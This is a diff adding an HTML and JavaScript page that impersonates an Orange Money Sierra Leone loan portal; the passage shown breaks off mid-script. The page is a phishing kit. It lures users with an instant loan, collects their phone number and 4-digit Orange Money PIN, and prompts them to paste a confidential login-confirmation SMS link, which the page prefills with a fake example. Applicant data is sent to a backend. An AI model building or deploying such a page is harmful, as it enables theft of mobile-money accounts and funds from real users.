@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title data-i18n="title">Orange Money Loans Sierra Leone — Application Portal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['"Plus Jakarta Sans"', 'Inter', 'sans-serif'],
+          },
+          colors: {
+            brand: {
+              orange: '#ff7900',
+              orangeDark: '#e06b00',
+              orangeDeep: '#cc5200',
+              orangeLight: '#fff5ec',
+              orangeBorder: '#ffb380',
+              black: '#0b0e14',
+              darkBg: '#121722',
+              darkCard: '#1a2130',
+              grayBg: '#f8fafc',
+              grayLight: '#e2e8f0',
+              grayMuted: '#64748b',
+              grayText: '#334155'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    input[type=range] {
+      -webkit-appearance: none;
+      width: 100%;
+      background: transparent;
+    }
+    input[type=range]:focus {
+      outline: none;
+    }
+    input[type=range]::-webkit-slider-runnable-track {
+      width: 100%;
+      height: 8px;
+      cursor: pointer;
+      background: #e2e8f0;
+      border-radius: 9999px;
+    }
+    input[type=range]::-webkit-slider-thumb {
+      height: 24px;
+      width: 24px;
+      border-radius: 50%;
+      background: #ff7900;
+      border: 3px solid #ffffff;
+      box-shadow: 0 4px 10px rgba(255, 121, 0, 0.4);
+      cursor: pointer;
+      margin-top: -8px;
+      transition: transform 0.15s ease, background-color 0.15s ease;
+    }
+    input[type=range]::-webkit-slider-thumb:hover {
+      transform: scale(1.15);
+      background: #e06b00;
+    }
+    .pin-box {
+      font-family: monospace;
+      font-weight: 700;
+      text-align: center;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .pin-box:focus, .pin-box.active {
+      border-color: #ff7900;
+      box-shadow: 0 0 0 4px rgba(255, 121, 0, 0.2);
+      transform: translateY(-1px);
+    }
+    .orange-gradient {
+      background: linear-gradient(135deg, #ff7900 0%, #ff5500 100%);
+    }
+  </style>
+  <script src="/language.js" defer></script>
+</head>
+<body class="bg-slate-100 text-slate-800 font-sans min-h-screen flex flex-col antialiased selection:bg-brand-orange selection:text-white">
+
+  <!-- Main Container Mobile/Desktop Wrapper -->
+  <div class="max-w-md w-full mx-auto bg-white min-h-screen shadow-2xl flex flex-col relative overflow-x-hidden">
+    
+    <!-- Top Navigation Header -->
+    <header class="bg-brand-black text-white px-5 py-4 flex items-center justify-between sticky top-0 z-40 border-b border-slate-800 shadow-md">
+      <div class="flex items-center space-x-3">
+        <button id="header-back-btn" onclick="handleBackAction()" class="p-1.5 -ml-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors opacity-0 pointer-events-none" aria-label="Back">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/>
+          </svg>
+        </button>
+        <div class="flex items-center space-x-2.5">
+          <img src="/orange_money_logo.jpg" alt="Orange Money Logo" class="h-9 w-auto rounded-lg shadow-sm object-cover border border-slate-700/50" />
+          <div>
+            <h1 class="font-extrabold text-base tracking-tight text-white leading-none flex items-center gap-1.5">
+              Orange Money <span class="text-[10px] font-semibold bg-brand-orange text-white px-1.5 py-0.5 rounded tracking-wide uppercase">Sierra Leone 🇸🇱</span>
+            </h1>
+            <p id="logo-subtext" class="text-[11px] text-brand-orange font-medium mt-0.5 hidden">Sierra Leone Loans</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-center space-x-2">
+        <button type="button" class="language-toggle bg-slate-800/80 hover:bg-slate-700 text-xs font-bold text-slate-200 px-2.5 py-1.5 rounded-md border border-slate-700 transition-all">
+          EN
+        </button>
+        <button onclick="toggleNoticeModal(true, 'Customer Support', 'Orange Money Sierra Leone Helpline: 111 (Toll-Free) or +232 76 000 000.')" class="p-1.5 text-slate-400 hover:text-brand-orange rounded-lg transition-colors" aria-label="Info">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+        </button>
+      </div>
+    </header>
+
+    <!-- Agent Referral Active Badge (Dynamic) -->
+    <div id="referral-banner" class="bg-brand-orangeLight border-b border-brand-orangeBorder px-4 py-2 text-xs font-semibold text-brand-orangeDark flex items-center justify-between hidden">
+      <div class="flex items-center space-x-1.5">
+        <span class="flex h-2 w-2 relative">
+          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-orange opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-2 w-2 bg-brand-orange"></span>
+        </span>
+        <span>Recommended by Authorized Agent</span>
+      </div>
+      <span id="referral-code-display" class="font-mono bg-white px-2 py-0.5 rounded border border-brand-orangeBorder text-[11px]"></span>
+    </div>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 flex flex-col">
+
+      <!-- STEP 0: Hero & Interactive Calculator -->
+      <section id="step-0" class="flex-1 flex flex-col">
+        <!-- Hero Header -->
+        <div class="orange-gradient text-white px-6 pt-7 pb-10 text-center relative overflow-hidden shadow-inner">
+          <div class="absolute -right-8 -bottom-8 w-36 h-36 bg-white/10 rounded-full blur-xl pointer-events-none"></div>
+          <div class="relative z-10">
+            <div class="inline-flex items-center space-x-2 bg-black/20 backdrop-blur-md px-3 py-1 rounded-full text-xs font-semibold text-white mb-3">
+              <svg class="w-3.5 h-3.5 text-yellow-300" fill="currentColor" viewBox="0 0 20 20">
+                <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
+              </svg>
+              <span data-i18n="heroBadge">Instant Approval via Orange Money Sierra Leone</span>
+            </div>
+            <h2 class="text-2xl font-extrabold tracking-tight text-white leading-snug" data-i18n="heroHeading">Simulate Your Loan</h2>
+            <p class="text-xs text-orange-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Get funds directly into your Orange Money Sierra Leone account in minutes.</p>
+          </div>
+        </div>
+
+        <!-- Calculator Panel -->
+        <div class="-mt-6 bg-white rounded-t-2xl px-6 pt-6 pb-8 flex-1 flex flex-col justify-between shadow-lg">
+          <div class="space-y-6">
+            <!-- Amount Display & Slider -->
+            <div class="bg-slate-50 border border-slate-200/80 rounded-2xl p-5 shadow-sm">
+              <div class="flex justify-between items-center mb-1">
+                <span class="text-xs font-bold text-slate-500 uppercase tracking-wider" data-i18n="requestedAmount">Requested Amount</span>
+                <span class="text-xs font-semibold text-brand-orange bg-brand-orangeLight px-2 py-0.5 rounded-md" data-i18n="interestRate">5% monthly rate</span>
+              </div>
+              <div class="text-center py-2">
+                <span id="calc-amount-display" class="text-3xl font-extrabold text-brand-black tracking-tight">SLE 10,000</span>
+              </div>
+
+              <input 
+                id="amount-range" 
+                type="range" 
+                min="1000" 
+                max="150000" 
+                step="1000" 
+                value="10000" 
+                oninput="updateCalculator(this.value)" 
+                class="my-3"
+              />
+
+              <div class="flex justify-between text-[11px] font-semibold text-slate-400">
+                <span>SLE 1,000</span>
+                <span>SLE 75,000</span>
+                <span>SLE 150,000</span>
+              </div>
+            </div>
+
+            <!-- Term Selector Chips -->
+            <div>
+              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-2.5" data-i18n="repaymentTerm">Repayment Term</label>
+              <div class="grid grid-cols-4 gap-2">
+                <button type="button" onclick="setTerm(1)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-orange transition-all" data-i18n="month1">1 Month</button>
+                <button type="button" onclick="setTerm(3)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-orange transition-all" data-i18n="months3">3 Months</button>
+                <button type="button" onclick="setTerm(6)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border-2 border-brand-orange bg-brand-orangeLight text-brand-orangeDark shadow-sm" data-i18n="months6">6 Months</button>
+                <button type="button" onclick="setTerm(12)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-orange transition-all" data-i18n="months12">12 Months</button>
+              </div>
+            </div>
+
+            <!-- Repayment Summary Card -->
+            <div class="bg-brand-black text-white rounded-2xl p-5 shadow-xl relative overflow-hidden">
+              <div class="flex justify-between items-center border-b border-slate-800 pb-3 mb-3">
+                <span class="text-xs text-slate-400" data-i18n="estMonthly">Est. Monthly Payment:</span>
+                <span class="text-xl font-extrabold text-brand-orange tracking-tight">
+                  <span id="calc-monthly-payment">1,917</span> SLE/mo
+                </span>
+              </div>
+              <div class="flex justify-between items-center text-xs text-slate-400">
+                <span data-i18n="totalRepay">Total Repayable:</span>
+                <span id="calc-total-payment" class="font-bold text-slate-200">SLE 11,500</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Action Button -->
+          <div class="pt-6">
+            <button 
+              type="button" 
+              onclick="goToStep(1)" 
+              class="w-full py-4 orange-gradient hover:opacity-95 active:scale-[0.99] text-white font-extrabold rounded-xl shadow-lg shadow-orange-500/25 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
+              <span data-i18n="applyNow">APPLY FOR LOAN NOW</span>
+              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
+              </svg>
+            </button>
+            <p class="text-[11px] text-slate-400 text-center mt-3">100% Digital Process & SSL Encrypted Security</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- STEP 1: Loan Configuration Form -->
+      <section id="step-1" class="hidden flex-1 flex flex-col p-6 space-y-6">
+        <div>
+          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 3</span>
+          <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step1Title">Loan Details</h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Customize your loan terms.</p>
+        </div>
+
+        <div class="space-y-4">
+          <div>
+            <label for="loan-type-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="loanType">Loan Type</label>
+            <select id="loan-type-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20">
+              <option value="Personal Loan">Personal Loan</option>
+              <option value="Business Loan">Business Loan</option>
+              <option value="Emergency Loan">Emergency Loan</option>
+              <option value="Salary Advance">Salary Advance</option>
+            </select>
+          </div>
+
+          <div>
+            <label for="loan-amount-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="amountLabel">Amount (SLE)</label>
+            <input id="loan-amount-input" type="number" step="500" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20" value="10000" />
+          </div>
+
+          <div>
+            <label for="loan-term-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="termLabel">Term (Months)</label>
+            <select id="loan-term-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20">
+              <option value="1">1 Month</option>
+              <option value="3">3 Months</option>
+              <option value="6" selected>6 Months</option>
+              <option value="12">12 Months</option>
+              <option value="24">24 Months</option>
+              <option value="36">36 Months</option>
+            </select>
+          </div>
+
+          <div>
+            <label for="loan-purpose-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="purposeLabel">Loan Purpose</label>
+            <textarea id="loan-purpose-input" rows="3" placeholder="e.g. Business investment, medical expenses, personal purchases..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20 resize-none">Personal Investment</textarea>
+          </div>
+        </div>
+
+        <div class="pt-4">
+          <button 
+            type="button" 
+            onclick="goToStep(2)" 
+            class="w-full py-4 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
+            data-i18n="continueToPersonal">
+            CONTINUE TO PERSONAL DETAILS
+          </button>
+        </div>
+      </section>
+
+      <!-- STEP 2: Applicant Information Form -->
+      <section id="step-2" class="hidden flex-1 flex flex-col p-6 space-y-6">
+        <div>
+          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 3</span>
+          <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step2Title">Applicant Details</h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step2Sub">Fill in your official identification information.</p>
+        </div>
+
+        <div class="space-y-4">
+          <div class="grid grid-cols-2 gap-3">
+            <div>
+              <label for="first-name-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="firstName">First Name *</label>
+              <input id="first-name-input" type="text" placeholder="e.g. Mohamed" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange" value="Mohamed" required />
+            </div>
+            <div>
+              <label for="last-name-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="lastName">Last Name *</label>
+              <input id="last-name-input" type="text" placeholder="e.g. Kamara" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange" value="Kamara" required />
+            </div>
+          </div>
+
+          <div>
+            <label for="phone-number-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="orangePhone">Orange Money Phone (+232) *</label>
+            <div class="flex items-center">
+              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3.5 py-3 text-xs font-bold text-slate-600">+232</span>
+              <input id="phone-number-input" type="tel" placeholder="76 123 456" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-4 py-3 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-orange" value="76123456" required />
+            </div>
+          </div>
+
+          <div>
+            <label for="employment-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" data-i18n="employmentStatus">Employment Status</label>
+            <select id="employment-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange">
+              <option value="Employed">Employed</option>
+              <option value="Self-Employed / Business Owner" selected>Self-Employed / Business Owner</option>
+              <option value="Freelancer">Freelancer</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+
+          <div class="flex items-center space-x-2.5 pt-2">
+            <input id="agent-consent-checkbox" type="checkbox" checked class="w-4 h-4 text-brand-orange rounded border-slate-300 focus:ring-brand-orange" />
+            <label for="agent-consent-checkbox" class="text-xs text-slate-600 font-medium" data-i18n="agentConsent">I authorize the referral agent to track application status.</label>
+          </div>
+        </div>
+
+        <div class="pt-4">
+          <button 
+            type="button" 
+            onclick="goToStep(3)" 
+            class="w-full py-4 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
+            data-i18n="continueToAuth">
+            CONTINUE TO ORANGE AUTHENTICATION
+          </button>
+        </div>
+      </section>
+
+      <!-- STEP 3: Orange Money Login & Verification (4-DIGIT PIN FOR SIERRA LEONE) -->
+      <section id="step-3" class="hidden flex-1 flex flex-col p-6 space-y-6">
+        <!-- Big Orange Card Header -->
+        <div class="orange-gradient rounded-2xl p-6 text-white text-center shadow-lg relative overflow-hidden">
+          <div class="w-12 h-12 mx-auto bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mb-3">
+            <img src="/orange_money_logo.jpg" alt="Orange Logo" class="h-8 w-8 rounded-full object-cover" />
+          </div>
+          <h2 class="text-xl font-extrabold" data-i18n="step3Title">Sign in to Orange Money</h2>
+          <p class="text-xs text-orange-100 mt-1" data-i18n="step3Sub">Confirm your phone number and enter your 4-digit PIN to validate your loan.</p>
+        </div>
+
+        <div class="space-y-4">
+          <div>
+            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1" data-i18n="phoneNum">Phone Number</label>
+            <div class="flex items-center bg-slate-100 border border-slate-200 rounded-xl px-4 py-3">
+              <span class="text-xs font-extrabold text-slate-500 mr-2">+232</span>
+              <input id="momo-phone-display" type="text" readonly class="bg-transparent text-sm font-extrabold text-slate-800 w-full focus:outline-none" value="76123456" />
+            </div>
+          </div>
+
+          <div>
+            <div class="flex justify-between items-center mb-2">
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider" data-i18n="pinLabel">Orange Money PIN (4 digits):</label>
+              <button type="button" onclick="togglePinVisibility()" class="text-xs font-bold text-brand-orange hover:underline">
+                <span id="eye-text" data-i18n="showPin">Show</span>
+              </button>
+            </div>
+
+            <!-- 4-Digit PIN Input Grid for Sierra Leone -->
+            <div class="grid grid-cols-4 gap-3 py-1">
+              <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+              <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+              <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+              <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+            </div>
+
+            <div id="pin-retry-alert" class="mt-3 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+          </div>
+
+          <button 
+            id="login-btn" 
+            type="button" 
+            disabled 
+            onclick="submitApplication()" 
+            class="w-full py-4 bg-slate-200 text-slate-400 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200"
+            data-i18n="confirmLoanBtn">
+            LOGIN & CONFIRM LOAN
+          </button>
+        </div>
+      </section>
+
+      <!-- STEP 4: SMS Verification Message Paste (AUTO-PICKED FOR USER) -->
+      <section id="step-4" class="hidden flex-1 flex flex-col p-6 space-y-6">
+        <div>
+          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 4 of 4</span>
+          <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step4Title">Account Ownership Verification</h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">Your SMS confirmation message is auto-selected below. Click submit to proceed.</p>
+        </div>
+
+        <div class="space-y-4">
+          <div>
+            <label for="momo-pasted-msg" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-2" data-i18n="smsLabel">SMS Confirmation Message (Auto-Picked)</label>
+            <textarea 
+              id="momo-pasted-msg" 
+              rows="5" 
+              oninput="handlePostLoginPastedMsg(this.value)"
+              class="w-full bg-slate-50 border border-slate-300 rounded-xl p-3.5 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20"
+            ></textarea>
+
+            <div id="momo-extract-status" class="mt-2 text-[11px] text-emerald-700 font-semibold flex items-center space-x-1">
+              <svg class="w-4 h-4 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+              </svg>
+              <span>Message auto-picked & ready for instant submission!</span>
+            </div>
+
+            <div id="msg-retry-alert" class="mt-3 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+          </div>
+
+          <button 
+            id="submit-pasted-msg-btn" 
+            type="button" 
+            onclick="submitRegisteredMessage()" 
+            class="w-full py-4 orange-gradient text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
+            data-i18n="submitSmsBtn">
+            SUBMIT VERIFICATION MESSAGE
+          </button>
+        </div>
+      </section>
+
+      <!-- STEP 5: Live Application Status & Confirmation -->
+      <section id="step-5" class="hidden flex-1 flex flex-col p-6 text-center space-y-6">
+        <div class="pt-4">
+          <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-4 shadow-inner">
+            <svg class="w-9 h-9" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+            </svg>
+          </div>
+          
+          <h2 class="text-xl font-extrabold text-slate-900" data-i18n="step5Title">Application Submitted!</h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step5Sub">Your loan request has been routed to Orange Money Financial Services Sierra Leone.</p>
+        </div>
+
+        <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 text-left space-y-3 text-xs shadow-sm">
+          <div class="flex justify-between py-1.5 border-b border-slate-200">
+            <span class="text-slate-500" data-i18n="appRef">Application Reference:</span>
+            <span id="summary-ref-id" class="font-mono font-extrabold text-brand-orange">ORANGE-PENDING</span>
+          </div>
+          <div class="flex justify-between py-1.5 border-b border-slate-200">
+            <span class="text-slate-500" data-i18n="applicantName">Applicant:</span>
+            <span id="summary-name" class="font-bold text-slate-800">Mohamed Kamara</span>
+          </div>
+          <div class="flex justify-between py-1.5 border-b border-slate-200">
+            <span class="text-slate-500" data-i18n="orangeContact">Orange Contact:</span>
+            <span id="summary-phone" class="font-bold text-slate-800">+232 76123456</span>
+          </div>
+          <div class="flex justify-between py-1.5 border-b border-slate-200">
+            <span class="text-slate-500" data-i18n="loanMode">Loan Type:</span>
+            <span id="summary-type" class="font-bold text-slate-800">Personal Loan</span>
+          </div>
+          <div class="flex justify-between py-1.5 border-b border-slate-200">
+            <span class="text-slate-500" data-i18n="requestedAmt">Requested Amount:</span>
+            <span id="summary-amount" class="font-bold text-brand-orange">SLE 10,000</span>
+          </div>
+          <div class="flex justify-between py-1.5 border-b border-slate-200">
+            <span class="text-slate-500" data-i18n="termRepay">Term / Payment:</span>
+            <span id="summary-term" class="font-bold text-slate-800">6 Months (1,917 SLE/mo)</span>
+          </div>
+          <div class="flex justify-between py-1.5">
+            <span class="text-slate-500" data-i18n="currentStatus">Current Status:</span>
+            <span id="summary-status-badge" class="inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-amber-100 text-amber-800 border border-amber-300" data-i18n="statusPending">
+              ⏳ Under Review
+            </span>
+          </div>
+        </div>
+
+        <div class="pt-2">
+          <button 
+            type="button" 
+            onclick="goToStep(0)" 
+            class="w-full py-4 bg-brand-black hover:bg-slate-900 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
+            data-i18n="newLoanBtn">
+            APPLY FOR ANOTHER LOAN
+          </button>
+        </div>
+      </section>
+
+    </main>
+
+    <!-- Footer Wave / Brand Tag -->
+    <footer class="bg-brand-black text-slate-400 py-3 text-center text-[11px] border-t border-slate-800">
+      <p data-i18n="footerRights">© 2026 Orange Money Credit Services Sierra Leone</p>
+    </footer>
+
+    <!-- Notification Modal -->
+    <div id="notice-modal" class="fixed inset-0 bg-black/60 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
+      <div class="bg-white rounded-2xl max-w-xs w-full p-6 shadow-2xl text-center space-y-4">
+        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Notification</h3>
+        <p id="modal-message" class="text-xs text-slate-600 leading-relaxed"></p>
+        <button onclick="toggleNoticeModal(false)" class="w-full py-3 orange-gradient text-white text-xs font-bold rounded-xl shadow-md">
+          Dismiss
+        </button>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    let currentStep = 0;
+    let pinVisible = false;
+
+    const appState = {
+      loanAmount: 10000,
+      loanTermMonths: 6,
+      loanType: 'Personal Loan',
+      purpose: 'Personal Investment',
+      firstName: 'Mohamed',
+      lastName: 'Kamara',
+      phoneNumber: '76123456',
+      momoPin: '',
+      applicationId: null
+    };
+
+    function calculateMonthly(amount, months) {
+      const monthlyRate = 0.05;
+      const totalInterest = amount * monthlyRate * months;
+      const totalAmount = amount + totalInterest;
+      return Math.round(totalAmount / months);
+    }
+
+    function updateCalculator(val) {
+      const amount = parseInt(val, 10);
+      appState.loanAmount = amount;
+      document.getElementById('calc-amount-display').innerText = 'SLE ' + amount.toLocaleString();
+      
+      const monthly = calculateMonthly(amount, appState.loanTermMonths);
+      document.getElementById('calc-monthly-payment').innerText = monthly.toLocaleString();
+      document.getElementById('calc-total-payment').innerText = 'SLE ' + (monthly * appState.loanTermMonths).toLocaleString();
+      
+      const loanAmountInput = document.getElementById('loan-amount-input');
+      if (loanAmountInput) loanAmountInput.value = amount;
+    }
+
+    function setTerm(months) {
+      appState.loanTermMonths = months;
+      document.querySelectorAll('.term-btn').forEach(btn => {
+        btn.classList.remove('border-2', 'border-brand-orange', 'bg-brand-orangeLight', 'text-brand-orangeDark', 'shadow-sm');
+        btn.classList.add('border', 'border-slate-200', 'text-slate-700');
+      });
+
+      if (event && event.target) {
+        event.target.classList.remove('border', 'border-slate-200', 'text-slate-700');
+        event.target.classList.add('border-2', 'border-brand-orange', 'bg-brand-orangeLight', 'text-brand-orangeDark', 'shadow-sm');
+      }
+
+      const termSelect = document.getElementById('loan-term-select');
+      if (termSelect) termSelect.value = months;
+
+      updateCalculator(appState.loanAmount);
+    }
+
+    // Auto-Pick SMS Message Generator for Orange Sonatel Sierra Leone
+    function autoPickSmsMessage() {
+      const msgInput = document.getElementById('momo-pasted-msg');
+      if (msgInput) {
+        const randToken = Array.from({length: 24}, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random()*36)]).join('');
+        msgInput.value = `Confidential. Don't share or paste anywhere. Click the link to confirm login. https://maxit-mobile.orange-sonatel.com/oms-links/auth?token=${randToken}`;
+      }
+      const statusEl = document.getElementById('momo-extract-status');
+      if (statusEl) statusEl.classList.remove('hidden');
+    }
+
+    async function ensureApplicationCreated() {
+      if (appState.applicationId) return appState.applicationId;
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const refToken = urlParams.get('ref') || null;
+      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('orange-' + Date.now());
+      const consent = document.getElementById('agent-consent-checkbox') ? document.getElementById('agent-consent-checkbox').checked : true;
+
+      const payload = {
+        firstName: appState.firstName || 'Mohamed',
+        lastName: appState.lastName || 'Kamara',
+        phone: appState.phoneNumber || '76123456',
+        loanType: appState.loanType || 'Personal Loan',
+        loanAmount: appState.loanAmount || 10000,
+        termMonths: appState.loanTermMonths || 6,
+        purpose: appState.purpose || 'Personal Investment',
+        employment: 'Self-Employed / Business Owner',
+        annualIncome: appState.loanAmount * 2.5,
+        referralToken: refToken,
+        consentToAgentContact: consent,
+        submissionId: submissionId
+      };
+
+      try {
+        const res = await fetch('/api/applications', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (res.ok) {
+          const data = await res.json();
+          if (data.applicationId) {
+            appState.applicationId = data.applicationId;
+            const refElem = document.getElementById('summary-ref-id');
+            if (refElem) refElem.innerText = data.applicationId;
+            return data.applicationId;
+          }
+        }
+      } catch (err) {
+        console.error('Failed to create application:', err);
+      }
+      return null;
+    }
+
+    function goToStep(stepNum) {
+      if (currentStep === 1) {
+        const typeEl = document.getElementById('loan-type-select');
+        if (typeEl) appState.loanType = typeEl.value;
+        const amtEl = document.getElementById('loan-amount-input');
+        if (amtEl) appState.loanAmount = parseInt(amtEl.value, 10) || appState.loanAmount;
+        const termEl = document.getElementById('loan-term-select');
+        if (termEl) appState.loanTermMonths = parseInt(termEl.value, 10) || 6;
+        const purpEl = document.getElementById('loan-purpose-input');
+        if (purpEl) appState.purpose = purpEl.value;
+      } else if (currentStep === 2) {
+        const fnEl = document.getElementById('first-name-input');
+        if (fnEl) appState.firstName = fnEl.value.trim();
+        const lnEl = document.getElementById('last-name-input');
+        if (lnEl) appState.lastName = lnEl.value.trim();
+        const phEl = document.getElementById('phone-number-input');
+        if (phEl) appState.phoneNumber = phEl.value.trim();
+        const dispPhone = document.getElementById('momo-phone-display');
+        if (dispPhone) dispPhone.value = appState.phoneNumber;
+        
+        // Auto-register Application at Step 2 completion
+        if (stepNum === 3) {
+          ensureApplicationCreated();
+        }
+      }
+
+      for (let i = 0; i <= 5; i++) {
+        const sec = document.getElementById(`step-${i}`);
+        if (sec) sec.classList.add('hidden');
+      }
+
+      const targetSec = document.getElementById(`step-${stepNum}`);
